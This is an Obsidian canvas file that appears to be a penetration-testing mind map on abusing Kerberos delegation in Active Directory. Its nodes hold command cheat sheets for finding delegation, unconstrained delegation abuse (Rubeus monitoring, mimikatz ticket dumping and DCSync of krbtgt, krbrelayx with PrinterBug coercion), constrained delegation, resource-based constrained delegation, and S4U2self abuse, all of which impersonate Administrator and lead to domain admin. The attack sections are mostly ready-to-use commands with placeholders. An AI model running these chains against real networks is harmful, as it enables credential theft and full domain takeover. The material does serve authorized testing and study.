{
	"nodes":[
		{"id":"403b619ce08bb4e3","type":"group","x":-680,"y":-840,"width":3720,"height":4280,"color":"#32a5ff","label":"KERBEROS DELEGATION ABUSE"},
		{"id":"40732f68b99131ec","type":"group","x":3280,"y":1600,"width":1080,"height":763,"color":"1","label":"DOMAIN ADMIN"},
		{"id":"fc61d31e4960ef23","type":"group","x":3280,"y":480,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
		{"id":"5f0cce37b9d177ce","type":"group","x":-1920,"y":920,"width":1080,"height":760,"label":"NO CREDENTIALS"},
		{"id":"0fca99ee91fbb45a","type":"text","text":"# Resource-Based Constrained Delegation (RBCD)\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd\n\n\n>[!example] Tools\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)\n>- [rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)\n\n\n```shell\n# add computer account\nðŸŸ£ addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host '<dc>' -domain-netbios '<domain_netbios>' '<domain>'/'<user>':'<password>'\n\n# RBCD With added computer account using rubeus\nðŸ”µ Rubeus.exe hash /password:'<computer_pass>' /user:'<computer>' /domain:'<domain>'\nðŸ”µ Rubeus.exe s4u /user:'<fake_computer$>' /aes256:'<AES 256 hash>' /impersonateuser:administrator /msdsspn:cifs/'<victim.domain.local>' /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt\n\n# RBCD With added computer account using impacket\nðŸŸ£ rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' '<domain>'/'<user>':'<password>'\nðŸŸ£ getST.py -spn host/'<dc_fqdn>' '<domain>'/'<computer_account>':'<computer_pass>' -impersonate Administrator --dc-ip '<dc_ip>'\n```","x":240,"y":2120,"width":2160,"height":640},
		{"id":"00a802658a3e1eb6","type":"text","text":"# S4U2self abuse\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse#theory\n\n\n>[!example] Tools\n>- [getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)\n\n\n```shell\n#  Machine account's TGT\nðŸŸ£ getTGT.py -dc-ip \"<dc_ip>\" -hashes :\"<machine_hash>\" \"<domain>\"/\"<machine>$\"\n\n# Obtain a Service Ticket\nðŸŸ£ getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>\"/'<machine>$'\n\n```","x":240,"y":2840,"width":2160,"height":500},
		{"id":"f0b8abf03708004d","type":"text","text":"# DOMAIN ADMIN ","x":2500,"y":3065,"width":320,"height":50,"color":"1"},
		{"id":"7de4c5909ad5d9c9","type":"text","text":"# PASS THE TICKET (TGS)","x":2500,"y":2360,"width":400,"height":50,"color":"6"},
		{"id":"ea3271ca4953fd5c","type":"text","text":"# DOMAIN ADMIN ","x":2500,"y":2460,"width":320,"height":50,"color":"1"},
		{"id":"ecd06ada3a41de74","type":"text","text":"# KERBEROS DELEGATION ABUSE","x":-600,"y":1510,"width":548,"height":80,"color":"#32a5ff"},
		{"id":"05a2dfea3437bb53","type":"file","file":"INTERACTIVE-MAP.canvas","x":-1840,"y":1000,"width":920,"height":600},
		{"id":"48320816880211d6","type":"text","text":"# Unconstrained delegation \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/#unconstrained-delegations-kud\n\n\n>[!example] Tools\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [Mimikatz](https://github.com/gentilkiwi/mimkatz)\n>- [addspn](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py)\n>- [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)\n>- [krbrelayx](https://github.com/dirkjanm/krbrelayx/blob/master/krbrelayx.py)\n\n\n```shell\n# Rubeus as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains\nðŸ”µ Rubeus.exe monitor /interval:5\n# TGT can be used to request a Service Ticket for another service.\nðŸ”µ Rubeus.exe asktgs /ticket:\"base64_extracted_TGT\" /service:\"target_SPN\" /ptt\n# Use mimkatz to dump tickets from lsa and reuse them\nðŸ”µ mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export\n# Once the TGT is injected, it can natively be used when accessing a service\nðŸ”µ mimikatz privilege::debug lsadump::dcsync /dc:\"DomainController\" /domain:\"DOMAIN\" /user:krbtgt\n# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)\nðŸŸ£ addspn.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'\n# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs\nðŸŸ£ dnstool.py -u 'DOMAIN\\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'\n# 3. Check that the record was added successfully (after ~3 minutes)\nâšª nslookup attacker.DOMAIN_FQDN DomainController\n# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)\n# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keys\nâšª krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'\n# 4.b. or supply the right Kerberos long-term key directly\nâšª krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE\n# 5. Authentication coercion\n# PrinterBug, PetitPotam, PrivExchange, ...\nâšª printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'\n# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.\n# There should be a krbtgt ccache file in the current directory. And it can be used by\nâšª export KRB5CCNAME=`pwd`/'krbtgt.ccache'\n```","x":240,"y":-40,"width":2160,"height":1040},
		{"id":"5738e83a0e3bf07c","type":"text","text":"# Constrained delegation \n\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained#theory\n\n\n>[!example] Tools\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [impackt's getST](https://github.com/fortra/impacket/blob/master/examples/getST.py)\n>- [imacket's addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)\n>- [impackt's rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)\n## With protocol transition \n\n```shell\n# Get Tgt for user\nðŸ”µ Rubeus.exe hash /password:'<password>'\n# TGT can be used to request a Service Ticket for another service.\nðŸ”µ Rubeus.exe asktgt /user:'<user>' /domain:'<domain>' /aes256:'<AES 256 hash>'\n# request S4u2proxy\nðŸ”µ Rubeus.exe s4u /ticket:'<ticket>' /impersonateuser:'<admin_user>' /msdsspn:'<spn_constrained>' /altservice:'<altservice>' /ptt\n# exploit using impacket getST\nðŸŸ£ getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip '<dc_ip>' '<domain>/<user>:<password>' -altservice '<altservice>'\n```\n## Without protocol transition\n\n```shell\n# add computer account\nðŸŸ£ addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>' -dc-host '<dc>' -domain-netbios '<domain_netbios>' '<domain>/<user>:<password>'\n# RBCD With added computer account \nðŸŸ£ rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip '<dc>' -action 'write' -hashes '<hash>' '<domain>'/'<constrained>$'\n# request service ticket\nðŸŸ£ getST.py -spn host/'<constrained>' -impersonate Administrator --dc-ip '<dc_ip>' '<domain>'/'<rbcd_con>$':'<rbcd_conpass>'\n\nðŸŸ£ getST.py -spn '<constrained_spn>'/'<target>' -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip '<dc_ip>' -additional-ticket '<previous_ticket>'\n```","x":240,"y":1080,"width":2160,"height":940},
		{"id":"0b8094b48c5a2ac6","type":"text","text":"# PASS THE TICKET (TGS)","x":2500,"y":1525,"width":400,"height":50,"color":"6"},
		{"id":"8fecf2ff1be54cb8","type":"text","text":"# PASS THE TICKET (TGT)","x":2500,"y":455,"width":400,"height":50,"color":"6"},
		{"id":"8410fbf64d1d61a2","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":3360,"y":562,"width":920,"height":600,"color":"6"},
		{"id":"5a5a89667079978a","type":"file","file":"ATTACKS/GOT DOMAIN ADMIN ACCESS.canvas","x":3360,"y":1680,"width":920,"height":600,"color":"1"},
		{"id":"ba1cceffd6a605be","type":"text","text":"# Find delegation\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/kerberos/delegations/#theory\n\n\n>[!example] Tools\n>- [impacket's finddelegation.py](https://github.com/fortra/impacket/blob/master/examples/findDelegation.py)\n>- [bloodhound](https://github.com/SpecterOps/BloodHound)\n\n\n```shell\n# Scan for any delegation\nðŸŸ£ findDelegation.py \"<domain>\"/\"<user>\":\"<password>\"\n# bloodhound queries for unconstrained delegation (KUD) on a computer\nðŸ”´ MATCH (c:Computer {unconstraineddelegation:true}) RETURN c\n# bloodhound queries for unconstrained delegation (KUD) on a user\nðŸ”´ MATCH (c:User {unconstraineddelegation:true}) RETURN c\n# bloodhound queries for constrained delegation (KCD) on a computer\nðŸ”´ MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p\n# bloodhound queries for constrained delegation (KCD) on a user\nðŸ”´ MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: \"<MYTARGET.FQDN>\"})) RETURN p\n```","x":540,"y":-720,"width":2160,"height":600}
	],
	"edges":[
		{"id":"6d2097827b27abc6","fromNode":"5f0cce37b9d177ce","fromSide":"right","toNode":"403b619ce08bb4e3","toSide":"left"},
		{"id":"b415724af36529ae","fromNode":"ecd06ada3a41de74","fromSide":"right","toNode":"ba1cceffd6a605be","toSide":"left"},
		{"id":"d01447a2763b977e","fromNode":"ecd06ada3a41de74","fromSide":"right","toNode":"48320816880211d6","toSide":"left"},
		{"id":"919d738ae276b9c7","fromNode":"ecd06ada3a41de74","fromSide":"right","toNode":"5738e83a0e3bf07c","toSide":"left"},
		{"id":"6072e9a24a831d4c","fromNode":"ecd06ada3a41de74","fromSide":"right","toNode":"0fca99ee91fbb45a","toSide":"left"},
		{"id":"179cb3c9bca13b20","fromNode":"ecd06ada3a41de74","fromSide":"right","toNode":"00a802658a3e1eb6","toSide":"left"},
		{"id":"c3a2760f7367fa8d","fromNode":"48320816880211d6","fromSide":"right","toNode":"8fecf2ff1be54cb8","toSide":"left"},
		{"id":"b05ccff6d08046c2","fromNode":"5738e83a0e3bf07c","fromSide":"right","toNode":"0b8094b48c5a2ac6","toSide":"left"},
		{"id":"115477fdf2089637","fromNode":"0fca99ee91fbb45a","fromSide":"right","toNode":"7de4c5909ad5d9c9","toSide":"left"},
		{"id":"6d28b39bd5d8d851","fromNode":"0fca99ee91fbb45a","fromSide":"right","toNode":"ea3271ca4953fd5c","toSide":"left"},
		{"id":"93e8d0419f8b9515","fromNode":"00a802658a3e1eb6","fromSide":"right","toNode":"f0b8abf03708004d","toSide":"left"},
		{"id":"976f377368f1418d","fromNode":"403b619ce08bb4e3","fromSide":"right","toNode":"5a5a89667079978a","toSide":"left","color":"1"},
		{"id":"b46face16b938fa0","fromNode":"403b619ce08bb4e3","fromSide":"right","toNode":"8410fbf64d1d61a2","toSide":"left","color":"6"}
	]
}